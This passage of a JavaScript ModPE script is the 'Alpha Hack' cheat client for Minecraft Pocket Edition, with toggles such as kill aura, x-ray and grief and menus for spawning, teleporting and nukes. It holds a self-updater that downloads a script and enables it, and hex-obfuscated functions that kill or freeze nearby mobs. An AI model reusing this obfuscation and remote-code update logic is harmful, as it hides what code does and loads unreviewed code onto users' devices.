                                updateMod += new java.lang.String(typeb, 0, byteCount);               
                            }
                            var modpeFolder = ctx.getDir("modscripts", 0);
                            var modpeFile = new java.io.File(modpeFolder, "ALPHAHack.js");
                            var update = new java.io.PrintWriter(modpeFile);
                            update.write(updateMod);
                            update.flush();
                            update.close();
                            
                            try {
                                net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, false);
                                net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, true);
								print(version + space + "installed");
								  
                            }
                            catch(err) {
                                print("Error: \n" + err);
                            }
                        }
                        catch(err) {
                            print("Error: \n" + err);
                        }
                    }
                }
                var threadt = new java.lang.Thread(ru);
                threadt.start();
            }
        });
        var dialog = upd.create();
        dialog.show() 
    }
    catch(err) {
        print("Error: \n" + err);
    }
}


var sspam = false;

var hackk = false;
var showp = false;
var fch = false;
var onlyday = false;
var saddle = false;
var instakilled = false;
var instabreak = false;
var stackheart = false;
var parti = false;
var parti2 = false;
var nowalls = false;
var waterwalk = false;
var highjumps = false;
var grief = false;
var killaura = false;
var killfaura = false;
var uirender = false; 
var xxray = false; 
var stat22 = false; 
var healthy = true;
var infhun = false;
var firepunch = false;
var lightning = false;
var primedtnt = false;
var arrow = false;
var exporb = false;
var minecart = false;

var GUIColor = Color.TRANSPARENT
var GUIColor1 = Color.TRANSPARENT;
var GUIColor2 = Color.BLACK;
var GUIColor3 = Color.WHITE;
var GUIColor4 = Color.RED;
var GUIColor5 = Color.BLUE;
var GUIColor6 = Color.GRAY;
var GUIColor7 = Color.LTGRAY;
var GUIColor8 = Color.YELLOW;
var GUIColor9 = Color.CYAN;
var GUIColor10 = Color.DKGRAY;
var GUIColor11 = Color.GREEN;
var GUIColor12 = Color.MAGENTA;

var GUIName = Color.WHITE;

var GUIPos = Gravity.CENTER;
var GUIPos2 = Gravity.RIGHT;
var GUIPos3 = Gravity.LEFT;

var checkForUpdate=false;
var updateWindow=false; 
var newUpdate;
var updateMod;
                
var defaultDestroyTime = [
null, 1.5, 0.6, 0.5, 2, 2, 0, -1, null, null, null, null, 
0.5, 0.6, 3, 3, 3, 2, 0.2, 0.6, 0.3, 3, 3, null, 0.8, null, 
0.2, 0.7, null, null, 4, 0, 0, null, null, 0.8, null, 0, 
0, 0, 0, 3, 5, 2, 2, 2, 0, 1.5, 2, 50, 0, 0, null, 2, 2.5, 
null, 3, 5, 2.5, 0, 0.6, 3.5, 3.5, 1, 3, 0.4, 0.7, 2, 1, 
null, null, 5, null, 3, 3, null, null, null, 0.1, 0.5, 0.2, 
0.4, 0.6, 0, null, 2, 1, 0.4, 0.3, null, 1, 0.5, null, null, 
-1, 3, null, 1.5, null, null, 5, 0.3, 1, 0, 0, null, 2, 2, 
1.5, null, null, 2, null, 2, null, null, null, null, null, 
null, null, null, null, null, null, null, null, 0.8, null, 
null, null, null, null, 2, 2, 2, null, null, 2, null, 0, 0, 
null, null, null, null, null, null, null, null, null, null, 
null, null, 0.8, 0.8, 2, 2, null, null, null, null, null, null, 
null, null, null, null, null, 0.5, 0.1, 5, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, 0, 3.5, 50, 5, 0.6, 0.6, 5, null, null, null, null, 0
]; 

//you copy my script i copy yours
function healthIndicators() {
    var mobs = Entity.getAll();

    for(var i = 0; i < mobs.length; i++) {


        var xq = Entity.getX(mobs[i]) - getPlayerX();

        var yq = Entity.getY(mobs[i]) - getPlayerY();

        var zq = Entity.getZ(mobs[i]) - getPlayerZ();



        if(xq * xq + yq * yq + zq * zq <= 40 * 40 && mobs[i] != getPlayerEnt()) {

            if(Entity.getEntityTypeId(mobs[i]) == 10) {
                Entity.setNameTag(mobs[i], nameColor + "Chicken " + healthColor + Entity.getHealth(mobs[i]) + "/4"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 11) {
                Entity.setNameTag(mobs[i], nameColor + "Cow " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 12) {
                Entity.setNameTag(mobs[i], nameColor + "Pig " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 13) {
                Entity.setNameTag(mobs[i], nameColor + "Sheep " + healthColor + Entity.getHealth(mobs[i]) + "/8"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 14) {
                Entity.setNameTag(mobs[i], nameColor + "Wolf " + healthColor + Entity.getHealth(mobs[i]) + "/8"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 15) {
                Entity.setNameTag(mobs[i], nameColor + "Villager " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 16) {
                Entity.setNameTag(mobs[i], nameColor + "Mooshroom " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 17) {
                Entity.setNameTag(mobs[i], nameColor + "Squid " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
            }
if(Entity.getEntityTypeId(mobs[i]) == 18) {
                Entity.setNameTag(mobs[i], nameColor + "Rabbit " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 19) {
                Entity.setNameTag(mobs[i], nameColor + "Bat " + healthColor + Entity.getHealth(mobs[i]) + "/6"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 20) {
                Entity.setNameTag(mobs[i], nameColor + "Iron Golem " + healthColor + Entity.getHealth(mobs[i]) + "/100"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 21) {
                Entity.setNameTag(mobs[i], nameColor + "Snow Golem " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 22) {
                Entity.setNameTag(mobs[i], nameColor + "Ocelot " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 32) {
                Entity.setNameTag(mobs[i], nameColor + "Zombie " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 33) {
                Entity.setNameTag(mobs[i], nameColor + "Creeper " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 34) {
                Entity.setNameTag(mobs[i], nameColor + "Skeleton " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 35) {
                Entity.setNameTag(mobs[i], nameColor + "Spider " + healthColor + Entity.getHealth(mobs[i]) + "/16"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 36) {
                Entity.setNameTag(mobs[i], nameColor + "Zombie Pigman " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 37) {
                Entity.setNameTag(mobs[i], nameColor + "Slime " + healthColor + Entity.getHealth(mobs[i]) + "/16"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 38) {
                Entity.setNameTag(mobs[i], nameColor + "Enderman " + healthColor + Entity.getHealth(mobs[i]) + "/40"); 
            }
            if(Entity.getEntityTypeId(mobs[i]) == 39) {
                Entity.setNameTag(mobs[i], nameColor + "Silverfish " + healthColor + Entity.getHealth(mobs[i]) + "/8");
            }
            if(Entity.getEntityTypeId(mobs[i]) == 40) {
                Entity.setNameTag(mobs[i], nameColor + "Cave Spider " + healthColor + Entity.getHealth(mobs[i]) + "/12");
            }
            if(Entity.getEntityTypeId(mobs[i]) == 41) {
                Entity.setNameTag(mobs[i], nameColor + "Ghast " + healthColor + Entity.getHealth(mobs[i]) + "/10");
            }
            if(Entity.getEntityTypeId(mobs[i]) == 42) {
                Entity.setNameTag(mobs[i], nameColor + "Magma Cube " + healthColor + Entity.getHealth(mobs[i]) + "/16");
            }
            if(Entity.getEntityTypeId(mobs[i]) == 43) {
                Entity.setNameTag(mobs[i], nameColor + "Blaze " + healthColor + Entity.getHealth(mobs[i]) + "/20");
            }
if(Entity.getEntityTypeId(mobs[i]) == 44) {
                Entity.setNameTag(mobs[i], nameColor + "Zombie Villager " + healthColor + Entity.getHealth(mobs[i]) + "/20");
            }
if(Entity.getEntityTypeId(mobs[i]) == 45) {
                Entity.setNameTag(mobs[i], nameColor + "Witch " + healthColor + Entity.getHealth(mobs[i]) + "/26");
            }
        }
    }
}

var _0x87b8=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x48\x65\x61\x6C\x74\x68"];function killing(){var _0x816ax2=Entity[_0x87b8[0]]();for(var _0x816ax3=0;_0x816ax3<_0x816ax2[_0x87b8[1]];_0x816ax3++){var _0x816ax4=Entity[_0x87b8[2]](_0x816ax2[_0x816ax3])-getPlayerX();var _0x816ax5=Entity[_0x87b8[3]](_0x816ax2[_0x816ax3])-getPlayerY();var _0x816ax6=Entity[_0x87b8[4]](_0x816ax2[_0x816ax3])-getPlayerZ();if(_0x816ax4*_0x816ax4+_0x816ax5*_0x816ax5+_0x816ax6*_0x816ax6<=20*20&&_0x816ax2[_0x816ax3]!=getPlayerEnt()){if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==10){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==11){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==12){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==13){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==14){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==15){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==16){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==17){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==18){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==19){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==20){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==21){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==22){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==32){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==33){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==34){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==35){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==36){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==37){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==38){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==39){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==40){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==41){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==42){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==43){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==44){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==45){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)}}}}

var _0xcaf6=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x49\x6D\x6D\x6F\x62\x69\x6C\x65"];function killingf(){var _0xe017x2=Entity[_0xcaf6[0]]();var _0xe017x3=true;if(killfaura==false){_0xe017x3=false};for(var _0xe017x4=0;_0xe017x4<_0xe017x2[_0xcaf6[1]];_0xe017x4++){var _0xe017x5=_0xe017x2[_0xe017x4];var _0xe017x6=Entity[_0xcaf6[2]](_0xe017x2[_0xe017x4])-getPlayerX();var _0xe017x7=Entity[_0xcaf6[3]](_0xe017x2[_0xe017x4])-getPlayerY();var _0xe017x8=Entity[_0xcaf6[4]](_0xe017x2[_0xe017x4])-getPlayerZ();if(_0xe017x6*_0xe017x6+_0xe017x7*_0xe017x7+_0xe017x8*_0xe017x8<=20*20&&_0xe017x2[_0xe017x4]!=getPlayerEnt()){if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==10){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==11){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==12){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==13){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==14){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==15){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==16){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==17){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==18){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==19){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==20){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==21){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==22){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==32){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==33){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==34){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==35){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==36){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==37){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==38){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==39){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==40){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==41){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==42){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==43){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==44){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==45){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)}}}}

function dip2px(dips){
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
}

function newLevel(){ 
clientMessage(client + "§2Mods are enabling...");
var healthy = true;
}

function showMenuBtn(){
ctx.runOnUiThread(new Runnable({ run: function(){
    try{
        var layout = new LinearLayout(ctx);
        layout.setOrientation(1);
        var menuBtn = new Button(ctx);
menuBtn.setTextSize(24);
        menuBtn.setBackgroundDrawable(new android.graphics.drawable.BitmapDrawable(android.graphics.BitmapFactory.decodeByteArray(android.util.Base64.decode(bg64, 0) , 0, android.util.Base64.decode(bg64, 0).length)));
        menuBtn.setTextColor(Color.WHITE);
        menuBtn.setOnClickListener(new View.OnClickListener({
            onClick: function(viewarg){
 mainMenu()
//exit(); 
headerView();
menuBtn = null;
            }
        }));
        layout.addView(menuBtn);
 
        GUI = new PopupWindow(layout, dip2px(45), dip2px(45)); 

        GUI.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        GUI.showAtLocation(ctx.getWindow().getDecorView(), Gravity.RIGHT | Gravity.TOP, 0, 120);
        }catch(err){
            Toast.makeText(ctx, "An error occured: " + err, 1).show();
        }
    }}));
}
showMenuBtn(); 
function mainMenu(){
    ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var menuLayout = new LinearLayout(ctx);
            var menuScroll = new ScrollView(ctx);
            var menuLayout1 = new LinearLayout(ctx);
            menuLayout.setOrientation(1);
            menuLayout1.setOrientation(1);
            menuScroll.addView(menuLayout);
            menuLayout1.addView(menuScroll);

            var name = new TextView(ctx);
            name.setTextSize(25);
            name.setText("");
            name.setTextColor(GUIName);
            name.setGravity(Gravity.CENTER);
            menuLayout.addView(name);

var maker = new TextView(ctx);
            maker.setTextSize(20);
            maker.setText("");
            maker.setTextColor(GUIName);
            maker.setGravity(Gravity.CENTER);
            menuLayout.addView(maker);

var no = new TextView(ctx);
            no.setTextSize(25);
            no.setText("");
            no.setTextColor(GUIName);
            no.setGravity(Gravity.CENTER);
            menuLayout.addView(no);

var btn1 = new android.widget.Button(ctx);
		btn1.setText("Settings");
if(GetLang=="de_DE")btn1.setText("Einstellungen");
if(GetLang=="ko_KR")btn1.setText('설정');

if(GetLang=="es_MX")btn1.setText('Configuración');
//btn1.setTextColor(Color.BLUE);
		btn1.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
lmenu_menu(); 
//exitUI.dismiss(); 
menu.dismiss(); 
header.dismiss();
			}
		});
		menuLayout.addView(btn1);

var btn2 = new android.widget.Button(ctx);
btn2.setText("Hack Menu");
if(GetLang=="de_DE")btn2.setText('Hack Menü');
if(GetLang=="ko_KR")btn2.setText('해킹 메뉴');

if(GetLang=="es_MX")btn2.setText('Menú de hacks');
//btn2.setTextColor(Color.BLUE);
		btn2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
 cmenu_menu();
             menu.dismiss();
             //exitUI.dismiss();
header.dismiss();
			}
		});
menuLayout.addView(btn2);

var zz = new android.widget.Button(ctx);
zz.setText("ModPE Menu");
if(GetLang=="de_DE")zz.setText('Modpe Menü');
if(GetLang=="ko_KR")zz.setText('ModPE 메뉴');

if(GetLang=="es_MX")zz.setText('Menú de Modpe');
//zz.setTextColor(Color.BLUE);
		zz.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             zmenu_menu();
             menu.dismiss();
             //exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(zz);

var btn3 = new android.widget.Button(ctx);
		btn3.setText("Spawn Menu");
if(GetLang=="de_DE")btn3.setText('Spawn Menü');
if(GetLang=="ko_KR")btn3.setText('스폰 메뉴');

if(GetLang=="es_MX")btn3.setText('Menú de spawn');
//btn3.setTextColor(Color.BLUE);
		btn3.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             smenu_menu();
             menu.dismiss();
             //exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn3);

var btn4 = new android.widget.Button(ctx);
		btn4.setText("Effect Menu");
if(GetLang=="de_DE")btn4.setText('Effekt Menü');
if(GetLang=="ko_KR")btn4.setText('효과 메뉴');

if(GetLang=="es_MX")btn4.setText('Menú de efectos');
//btn4.setTextColor(Color.BLUE);
		btn4.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             emenu_menu();
             menu.dismiss();
             //exitUI.dismiss();
header.dismiss();
clientMessage(client + "§cMenu doesn't work in servers.");
			}
		});
		menuLayout.addView(btn4);

var btn5 = new android.widget.Button(ctx);
            btn5.setText("Teleport Menu");
if(GetLang=="de_DE")btn5.setText('Teleport Menü');
if(GetLang=="ko_KR")btn5.setText('텔레포트 메뉴');

if(GetLang=="es_MX")btn5.setText('teletransportación');
//btn5.setTextColor(Color.BLUE);
            btn5.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
menu.dismiss();
//exitUI.dismiss();
TeleMenu();
header.dismiss();
                }
            }));
            menuLayout.addView(btn5);

var btn6 = new android.widget.Button(ctx);
		btn6.setText("Nuke Menu");
if(GetLang=="de_DE")btn6.setText('Bomben Menü');
if(GetLang=="ko_KR")btn6.setText('핵폭탄 메뉴');

if(GetLang=="es_MX")btn6.setText('Menú de bomba nuclear');
//btn6.setTextColor(Color.BLUE);
		btn6.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             nmenu_menu();
             menu.dismiss();
             //exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn6);

var btn7 = new android.widget.Button(ctx);
            btn7.setText("Give Menu");
if(GetLang=="de_DE")btn7.setText('Item Menü');
if(GetLang=="ko_KR")btn7.setText('아이템 주기 메뉴');

if(GetLang=="es_MX")btn7.setText('Menú de tener');
//btn7.setTextColor(Color.BLUE);
            btn7.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
menu.dismiss();
//exitUI.dismiss();
GiveMenu();
header.dismiss();
clientMessage(client + "§cKits doesn't work in servers.");
                }
            }));
            menuLayout.addView(btn7);

var btn8 = new android.widget.Button(ctx);
		btn8.setText("Speed Menu");
if(GetLang=="de_DE")btn8.setText('Speed Menü');
if(GetLang=="ko_KR")btn8.setText('속도 메뉴');

if(GetLang=="es_MX")btn8.setText('Menú de velocidad');
//btn8.setTextColor(Color.BLUE);
		btn8.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             dmenu_menu();
             menu.dismiss();
             //exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn8);

var btn10 = new android.widget.Button(ctx);
            btn10.setText("Experience Menu");
if(GetLang=="de_DE")btn10.setText('XP Menü');
if(GetLang=="ko_KR")btn10.setText('경험치 메뉴');

if(GetLang=="es_MX")btn10.setText('Menú de experiencia');
//btn10.setTextColor(Color.BLUE);
            btn10.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
ExMenu();
menu.dismiss();
//exitUI.dismiss();
header.dismiss();
                }
            }));
            menuLayout.addView(btn10);

var btn13 = new android.widget.Button(ctx);
            btn13.setText("Morph Menu");
if(GetLang=="de_DE")btn13.setText('Morph Menü');
if(GetLang=="ko_KR")btn13.setText('변신 메뉴');

if(GetLang=="es_MX")btn13.setText('Menú de Morph');
//btn13.setTextColor(Color.BLUE);
            btn13.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
mMenu();
menu.dismiss();
//exitUI.dismiss();
clientMessage(client + "§cMenu doesn't work in servers.");
header.dismiss();
                }
            }));
            menuLayout.addView(btn13);

var btn11 = new android.widget.Button(ctx);
            btn11.setText("Weather Menu");
if(GetLang=="de_DE")btn11.setText('Wetter Menü');
if(GetLang=="ko_KR")btn11.setText('날씨 메뉴');

if(GetLang=="es_MX")btn11.setText('Menú de clima');
//btn11.setTextColor(Color.BLUE);
            btn11.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
WaMenu();
menu.dismiss();
//exitUI.dismiss();
header.dismiss();
                }
            }));
            menuLayout.addView(btn11);

var btn12 = new android.widget.Button(ctx);
		btn12.setText("Time Menu");
if(GetLang=="de_DE")btn12.setText('Zeit Menü');
if(GetLang=="ko_KR")btn12.setText('시간 메뉴');

if(GetLang=="es_MX")btn12.setText('Menú de tiempo');
//btn12.setTextColor(Color.BLUE);
		btn12.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             amenu_menu();
             menu.dismiss();
             //exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn12);

var source = new Button(ctx);
            source.setText("Mod Community");
if(GetLang=="de_DE")source.setText('Mod Gruppe');
if(GetLang=="ko_KR")source.setText('모드 커뮤니티');

if(GetLang=="es_MX")source.setText('Comunidad de mods');
//source.setTextColor(Color.BLUE);
            source.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
arceusMatt(); 
header.dismiss();
showMenuBtn();
print("Loading web page");
                }
            }));
            menuLayout.addView(source);

function arceusMatt()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('https://plus.google.com/communities/103695355587842948163');
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

menu = new PopupWindow(menuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            menu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            menu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function headerView(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var headerLayout = new LinearLayout(ctx);
            var headerScroll = new ScrollView(ctx);
            var headerLayout1 = new LinearLayout(ctx);
            headerLayout.setOrientation(1);
            headerLayout1.setOrientation(1);
            headerScroll.addView(headerLayout);
            headerLayout1.addView(headerScroll);

            var name = new TextView(ctx);
            name.setTextSize(20);
            name.setText("Alphα Hαck" + space + version + space + copyright);
            name.setTextColor(GUIName);
            name.setGravity(Gravity.CENTER);
            headerLayout.addView(name);

var maker = new TextView(ctx);
            maker.setTextSize(15);
            maker.setText(authers + space + "&" + space + authers2);
            maker.setTextColor(GUIName);
            maker.setGravity(Gravity.CENTER);
            headerLayout.addView(maker);

var exitb = new Button(ctx);
            exitb.setText("Exit AlphαHαck");
exitb.setTextColor(Color.RED);
            exitb.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){

                    menu.dismiss();

header.dismiss(); 

print("Closed successfully");

showMenuBtn();
                }
            }));
            headerLayout.addView(exitb);

header = new PopupWindow(headerLayout1, dip2px(180), dip2px(180));

header = new PopupWindow(headerLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight()/4);
header.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            header.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function lmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var lmenuLayout = new LinearLayout(ctx);
            var lmenuScroll = new ScrollView(ctx);
            var lmenuLayout1 = new LinearLayout(ctx);
            lmenuLayout.setOrientation(1);
            lmenuLayout1.setOrientation(1);
            lmenuScroll.addView(lmenuLayout);
            lmenuLayout1.addView(lmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText("Alphα Hαck" + space + version);
